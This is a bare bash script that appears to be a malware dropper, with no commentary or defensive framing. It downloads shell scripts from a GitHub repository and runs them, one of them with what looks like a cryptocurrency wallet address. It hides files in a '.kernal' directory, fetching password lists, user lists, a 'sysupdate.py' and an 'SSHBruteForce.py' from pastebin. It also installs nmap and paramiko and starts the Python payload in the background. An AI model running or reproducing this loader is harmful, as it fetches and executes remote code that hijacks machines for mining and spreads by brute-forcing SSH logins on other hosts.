#!/bin/bash
curl -o /tmp/test1.sh -s https://raw.githubusercontent.com/x15121525/java_testpp/master/script_kill;wget -O /tmp/test1.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/script_kill
sh /tmp/test1.sh
curl -o /tmp/test2.sh -s https://raw.githubusercontent.com/x15121525/java_testpp/master/script_work;wget -O /tmp/test2.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/script_work
sh /tmp/test2.sh 47c1Gqngx2Reu5HwPqc1uJP3iKJ8xiK9B3QXepN19LQn42jMyBNMhHHBauycpj5uG7EM6ErCKMSuW3W8YXJJgozdT5mMULW
curl -o /tmp/internal.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/internal.sh;wget -O /tmp/internal.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/internal.sh
sh /tmp/internal.sh
if [ -z $HOME ]; then
  mkdir /dev/shm/sys
  export HOME=/dev/shm/sys
fi
mkdir $HOME/.kernal
mkdir $HOME/.kernal/b
curl -o $HOME/.kernal/cmd_1.txt https://pastebin.com/raw/DJuvm8v0;wget -O $HOME/.kernal/cmd_1.txt https://pastebin.com/raw/DJuvm8v0
curl -o $HOME/.kernal/cmd.txt https://pastebin.com/raw/8uCHeF8k;wget -O $HOME/.kernal/cmd.txt https://pastebin.com/raw/8uCHeF8k
curl -o $HOME/.kernal/pwd.txt https://pastebin.com/raw/UG35FES2;wget -O $HOME/.kernal/pwd.txt https://pastebin.com/raw/UG35FES2
curl -o $HOME/.kernal/user_l.txt https://pastebin.com/raw/dkK8bZqn;wget -O $HOME/.kernal/user_l.txt https://pastebin.com/raw/dkK8bZqn
curl -o $HOME/.kernal/sysupdate.py https://pastebin.com/raw/bBVK9Juq;wget -O $HOME/.kernal/sysupdate.py https://pastebin.com/raw/bBVK9Juq
curl -o $HOME/.kernal/SSHBruteForce.py https://pastebin.com/raw/2Sz7cvdZ;wget -O $HOME/.kernal/SSHBruteForce.py https://pastebin.com/raw/2Sz7cvdZ

if cat /etc/os-release | grep "Ubuntu" ; then
        sudo apt install nmap -y
        sudo apt-get update -y
        sudo apt install python3-pip -y
        pip3 install paramiko
else
        yum -y install nmap
        yum -y install python3-pip
        pip3 install paramiko
fi
python3 $HOME/.kernal/sysupdate.py &
